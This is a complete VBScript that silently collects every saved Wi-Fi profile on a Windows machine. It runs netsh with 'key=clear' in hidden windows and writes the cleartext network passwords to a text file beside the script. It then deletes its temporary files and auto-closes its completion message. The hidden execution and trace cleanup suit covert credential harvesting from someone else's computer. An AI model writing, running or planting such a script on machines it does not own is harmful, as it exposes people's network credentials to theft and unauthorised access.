' Create Shell and FileSystemObject instances
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the file name for Wi-Fi details
Dim wifiDetailsFileName
wifiDetailsFileName = "wifi_passwords.txt"

' Get the script's directory
strScriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)

' Build the full path to the Wi-Fi details file
strFilePath = objFSO.BuildPath(strScriptDir, wifiDetailsFileName)

' Create the Wi-Fi details file if it doesn't exist
If Not objFSO.FileExists(strFilePath) Then
    Set newFile = objFSO.CreateTextFile(strFilePath)
    newFile.Close
End If

' Run the "netsh" command to show all profiles and save output to a temporary file
objShell.Run "cmd /c netsh wlan show profiles > """ & strScriptDir & "\profiles.txt""", 0, True

' Open the temporary file and read all Wi-Fi profiles
Set objFile = objFSO.OpenTextFile(strScriptDir & "\profiles.txt", 1)
Dim profiles
profiles = objFile.ReadAll
objFile.Close

' Extract profile names using regular expressions
Dim re
Set re = New RegExp
re.Global = True
re.IgnoreCase = True
re.Pattern = "All User Profile\s*:\s*(.*)"

Dim matches, match
Set matches = re.Execute(profiles)

' Open the Wi-Fi details file for appending
Dim wifiName, profileDetails, file
Set file = objFSO.OpenTextFile(strFilePath, 8, True)

' Loop through each profile and retrieve details
For Each match in matches
    wifiName = match.SubMatches(0)
    
    ' Run the "netsh" command to show profile details and save output to a temporary file
    objShell.Run "cmd /c netsh wlan show profiles """ & wifiName & """ key=clear > """ & strScriptDir & "\profile_details.txt""", 0, True
    
    ' Open the temporary file and read profile details
    Set objFile = objFSO.OpenTextFile(strScriptDir & "\profile_details.txt", 1)
    profileDetails = objFile.ReadAll
    objFile.Close
    objFSO.DeleteFile strScriptDir & "\profile_details.txt" ' Clean up temporary file
    
    ' Append profile details to the Wi-Fi details file
    file.WriteLine("Profile: " & wifiName)
    file.WriteLine(profileDetails)
    file.WriteLine("--------------------------------------------------")
Next

file.Close

' Clean up temporary profiles file
objFSO.DeleteFile strScriptDir & "\profiles.txt"

' Run the helper script to close the "Done" message box after 500 ms
objShell.Run "wscript.exe """ & strScriptDir & "\closeDone.vbs""", 0, False

' Display "Done" message
WScript.Echo "Done"
